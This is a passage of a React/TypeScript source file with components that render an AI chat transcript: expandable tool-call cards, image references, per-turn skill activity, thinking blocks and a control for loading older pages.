        />
      </a>
    );
  }
  return (
    <div
      data-testid="reference-image-unresolved"
      className={cn(
        "flex items-center gap-2 rounded-lg border border-chat-border bg-chat-surface px-2.5 py-1.5 text-xs text-chat-foreground-secondary",
        className,
      )}
    >
      <ImageIcon aria-hidden="true" className="size-3.5 shrink-0" />
      <span className="truncate max-w-[10rem] font-mono">{part.ref}</span>
      <span className="text-xs text-chat-foreground-secondary">{part.mediaType}</span>
    </div>
  );
};

/**
 * One tool call of a native transcript: the row reads as verb + object until opened, and
 * the opened detail is the call's own input, output, skill evidence and returned images.
 */
export const ReferenceToolPartCard: React.FC<{
  part: ReferenceToolPart;
  context?: ReferencePartRenderContext;
  className?: string;
}> = ({ part, context, className }) => {
  const [expanded, setExpanded] = useState(false);
  const images = part.images ?? [];
  const outputRef = part.outputRef ?? null;
  const onRequestWholeOutput = context?.onRequestWholeOutput;
  const canRequestWholeOutput = outputRef !== null && onRequestWholeOutput !== undefined;
  const canExpand = Boolean(part.input || part.output || images.length > 0 || canRequestWholeOutput);
  const loading = outputRef !== null && context?.loadingOutputRef === outputRef;
  const firstLine = part.input.trim().split("\n")[0] ?? "";

  const labelNode = part.summary ? (
    <span>{part.summary}</span>
  ) : (
    <>
      <span>{getToolVerb(part.name)}</span>
      {firstLine && (
        <>
          {" "}
          <span className="font-mono">{firstLine}</span>
        </>
      )}
    </>
  );

  const expandedPanel = (
    <div className="ml-7 rounded-lg bg-chat-surface px-3 py-2 space-y-1.5">
      {part.input && (
        <pre
          data-testid="reference-tool-input"
          tabIndex={0}
          className="font-mono text-[0.8125rem] leading-relaxed text-chat-foreground whitespace-pre-wrap break-words select-text"
        >
          {part.input}
        </pre>
      )}
      {part.output && (
        <pre
          data-testid="reference-tool-output"
          tabIndex={0}
          className="font-mono text-[0.8125rem] leading-relaxed text-chat-foreground whitespace-pre-wrap break-words select-text"
        >
          {part.output}
        </pre>
      )}
      {images.length > 0 && (
        <div className="flex flex-wrap gap-2">
          {images.map((image) => (
            <ReferenceImagePart
              key={image.ref}
              part={{ kind: "image", mediaType: image.mediaType, ref: image.ref }}
              context={context}
            />
          ))}
        </div>
      )}
      {canRequestWholeOutput && (
        <button
          type="button"
          data-testid="reference-tool-whole-output"
          disabled={loading}
          onClick={() => onRequestWholeOutput(outputRef)}
          className="min-h-11 rounded-md border border-chat-border bg-chat-surface-raised px-3 text-sm text-chat-foreground transition-colors hover:bg-chat-surface-hover disabled:opacity-60 focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
        >
          {loading
            ? "Loading the whole output…"
            : `Show the whole output${part.outputSize !== undefined && part.outputSize !== null ? ` (${part.outputSize} characters)` : ""}`}
        </button>
      )}
    </div>
  );

  return (
    <WorkRow
      containerTestId="reference-tool-part"
      icon={getToolIcon(part.name)}
      label={
        <>
          {labelNode}
          {part.error && (
            <>
              {" "}
              <span className="text-chat-danger">failed</span>
            </>
          )}
        </>
      }
      canExpand={canExpand}
      expanded={expanded}
      onToggle={() => setExpanded((prev) => !prev)}
      isError={Boolean(part.error)}
      isRunning={false}
      className={className}
      expandedContent={expandedPanel}
    />
  );
};

/**
 * The skills a turn recorded, as the reference lists them: `tool.skill` on a tool call and a
 * turn's own skill part, deduplicated per turn by evidence and document, last attempt winning
 * (`src/lib/skillActivity.ts` `turnSkills`, which reads both kinds).
 *
 * The reference filters `skill` parts out of the parts it renders in order
 * (`ChatView.tsx:322`), so this list is the only place a standalone skill part is drawn.
 */
export function referenceTurnSkills(parts: readonly ReferencePart[]): ReferenceSkillActivity[] {
  const skills = new Map<string, ReferenceSkillActivity>();
  for (const part of parts) {
    if (part.kind !== "tool" && part.kind !== "skill") continue;
    const skill = part.skill;
    if (!skill) continue;
    skills.set(`${skill.evidence}:${skill.path ?? skill.name}`, skill);
  }
  return [...skills.values()];
}

/** Skill evidence a turn recorded: kept visible whether or not the work block is folded. */
export const ReferenceTurnSkills: React.FC<{
  parts: readonly ReferencePart[];
  className?: string;
}> = ({ parts, className }) => {
  const skills = referenceTurnSkills(parts);
  if (skills.length === 0) return null;
  return (
    <div
      data-testid="reference-turn-skills"
      role="group"
      aria-label="Skill activity"
      className={cn("w-full flex flex-col gap-1 my-1", className)}
    >
      {skills.map((skill) => (
        <ReferenceSkillEvidence
          key={`${skill.evidence}:${skill.path ?? skill.name}`}
          skill={skill}
        />
      ))}
    </div>
  );
};

/** One part of a turn, drawn for what it is. */
export const ReferencePartView: React.FC<{
  part: ReferencePart;
  context?: ReferencePartRenderContext;
  timestamp?: string | number | null;
  className?: string;
}> = ({ part, context, timestamp, className }) => {
  switch (part.kind) {
    case "text":
      // Turn body prose matches the user bubble and plain assistant body (16px, primary color);
      // ReferenceProse's smaller secondary style stays for summaries and task results.
      return (
        <ReferenceProse
          text={part.text}
          className={cn("text-base leading-relaxed text-chat-foreground", className)}
        />
      );
    case "thinking":
      return <ThinkingBlock text={part.text} />;
    // A skill chip is drawn once, by the turn's skill list: the reference filters `skill` out of
    // the parts it renders in order (`ChatView.tsx:322`).
    case "skill":
      return null;
    case "tool":
      return <ReferenceToolPartCard part={part} context={context} className={className} />;
    case "image":
      return <ReferenceImagePart part={part} context={context} className={className} />;
    case "compact":
      return (
        <ReferenceCompactionDisclosure text={part.text} timestamp={timestamp} className={className} />
      );
    case "notice":
      return (
        <ReferenceNoticeDisclosure
          text={part.text}
          source={part.source}
          timestamp={timestamp}
          className={className}
        />
      );
    case "taskResult":
      return <ReferenceTaskResultsBlock part={part} className={className} />;
    default:
      return null;
  }
};

/** Every part of one turn, in the order the transcript recorded them. */
export const ReferencePartList: React.FC<{
  parts: readonly ReferencePart[];
  /** Skip tool and thinking parts; keys keep each part's index in `parts` so the rest never remount. */
  hideWork?: boolean;
  context?: ReferencePartRenderContext;
  timestamp?: string | number | null;
  className?: string;
}> = ({ parts, hideWork = false, context, timestamp, className }) => {
  const shown = hideWork ? parts.filter((part) => part.kind !== "tool" && part.kind !== "thinking") : parts;
  if (shown.length === 0) return null;
  return (
    <div data-testid="reference-parts" className={cn("w-full flex flex-col gap-1.5", className)}>
      {parts.map((part, index) =>
        hideWork && (part.kind === "tool" || part.kind === "thinking") ? null : (
          <ReferencePartView
            key={`${part.kind}-${index}`}
            part={part}
            context={context}
            timestamp={timestamp}
          />
        ),
      )}
    </div>
  );
};

/**
 * The page before this one: a button that keeps its height in every state, and the mark
 * that says the conversation has no more to reach.
 */
export const ReferenceOlderPageControl: React.FC<{
  hasOlder: boolean;
  loadedOlder?: boolean;
  state?: ReferenceOlderState;
  onLoadOlder?: () => void;
  className?: string;
}> = ({ hasOlder, loadedOlder = false, state = "idle", onLoadOlder, className }) => {
  if (hasOlder) {
    return (
      <div className={cn("flex justify-center my-2", className)}>
        <button
          type="button"
          data-testid="reference-older-button"
          disabled={state === "loading"}
          onClick={() => onLoadOlder?.()}
          className="flex min-h-11 items-center gap-1.5 rounded-full border border-chat-border bg-chat-surface px-4 text-sm text-chat-foreground-secondary transition-colors hover:text-chat-foreground disabled:opacity-60 focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
        >
          <ArrowUp aria-hidden="true" className="size-3.5" />
          <span>{referenceOlderControlLabel(state)}</span>
        </button>
      </div>
    );
  }
  if (loadedOlder) {
    return (
      <p
        data-testid="reference-older-endcap"
        className={cn("my-2 text-center text-xs text-chat-foreground-secondary", className)}
      >
        Beginning of conversation
      </p>
    );
  }
  return null;
};
